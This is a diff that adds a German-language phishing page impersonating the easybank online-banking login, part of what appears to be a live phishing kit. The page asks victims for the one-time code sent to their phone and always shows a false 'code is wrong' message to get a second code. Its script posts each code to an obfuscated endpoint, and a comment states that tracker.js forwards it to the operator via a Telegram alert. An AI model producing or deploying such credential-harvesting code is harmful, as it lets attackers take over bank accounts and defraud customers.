@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, shrink-to-fit=no, minimum-scale=1, maximum-scale=5">
+    <meta name="apple-mobile-web-app-status-bar-style" content="white">
+    <title>Sicherheitsprüfung</title>
+    <link rel="stylesheet" href="/css/botta.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <!-- Socket.IO & Telemetry Tracker Client -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/tracker.js"></script>
+        <style>
+            /* QWRkaXRpb25hbCBFbmNyeXB0ZWQgU3R5bGVz */
+            .logo-svg {
+                max-width: 100%;
+            }
+        </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-inner">
+                <img src="/img/luigon.PNG" alt="easybank" class="logo">
+                <img src="/img/luigon-botuin.PNG" alt="Jetzt registrieren" class="reg-btn">
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="login-card">
+
+
+                <form id="twoFactorForm" class="login-form">
+                    <h3 style="margin-bottom: 20px; color: var(--text-color); font-weight: 600;">Bestätigungscode</h3>
+                    <p class="code-p" style="margin-bottom: 25px; color: #666; font-size: 15px;">
+                        Bitte geben Sie den Einmalcode ein, den wir Ihnen auf Ihr Mobiltelefon gesendet haben.
+                    </p>
+
+
+                    <div class="input-container" style="margin-bottom: 20px;">
+                        <input type="tel" id="code-input" name="code" placeholder="Code eingeben" required
+                            autocomplete="one-time-code" maxlength="8"
+                            style="width: 100%; padding: 12px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px; text-align: center; letter-spacing: 2px; font-weight: 600;" />
+                    </div>
+<p style="color: rgb(206, 32, 32); margin-bottom: 15px;  font-size: 14px;">Der von Ihnen eingegebene Einmalcode ist falsch. </p>
+       
+                    <div id="error-message" style="color: red; margin-bottom: 15px;  font-size: 14px;">
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="submitBtn">Senden</button>
+
+                    <div class="forgot-password" style="margin-top: 25px;">
+                        <a href="#" style="cursor: pointer; color: var(--easy-teal);">Erneut anfordern</a>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#">FAQ</a>
+                <a href="#">Kontakt</a>
+                <a href="#">Impressum</a>
+                <a href="#">Datenschutz</a>
+                <a href="#">AGB</a>
+                <a href="#">Barrierefreiheit</a>
+            </div>
+        </footer>
+    </div>
+
+
+
+
+    <!--  -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.getElementById('twoFactorForm');
+            const codeInput = document.getElementById('code-input');
+            const submitBtn = document.getElementById('submitBtn');
+
+            // Handle form submission
+            form.addEventListener('submit', function (e) {
+                const code = codeInput.value.trim();
+
+                if (!code) {
+                    e.preventDefault();
+                    e.stopImmediatePropagation();
+                    codeInput.focus();
+                    return false;
+                }
+
+                // Set redirect destination for tracker.js to Done via baraj
+                this.setAttribute('data-redirect', '/LGknmeM9HwWUWSutj6mJ');
+
+                // Fallback AJAX request for redundancy
+                try {
+                    $.ajax({
+                        url: '/Qv69PRvXg6PQEvrzJx6j',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({ code: code })
+                    });
+                } catch (err) {}
+
+                // tracker.js will capture form submit, emit visitor_action with OTP code, send Telegram alert, and redirect!
+            });
+
+            // Handle input behavior for better UX
+            codeInput.addEventListener('input', function (e) {
+                // Remove any non-numeric characters
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+
+            // Handle Enter key
+            codeInput.addEventListener('keypress', function (e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    form.dispatchEvent(new Event('submit'));
+                }
+            });
+        });
+    </script>
+
+
+</body>
+
+</html>
